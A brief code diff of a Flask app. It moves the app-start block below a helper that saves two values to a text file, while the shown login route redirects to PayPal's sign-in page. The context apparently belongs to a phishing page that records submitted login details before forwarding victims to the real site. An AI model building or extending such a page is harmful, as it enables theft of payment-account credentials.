@@ -16,9 +16,11 @@ def login():
         return redirect("https://www.paypal.com/signin")
     return render_template('login.html')
 
-if __name__ == '__main__':
-    app.run(debug=True)
-
 def save_values_to_file(value1, value2, filename="output.txt"):
     with open(filename, "w") as file:
         file.write(f"{value1}\n{value2}")
+
+
+if __name__ == '__main__':
+    app.run(debug=True)
+
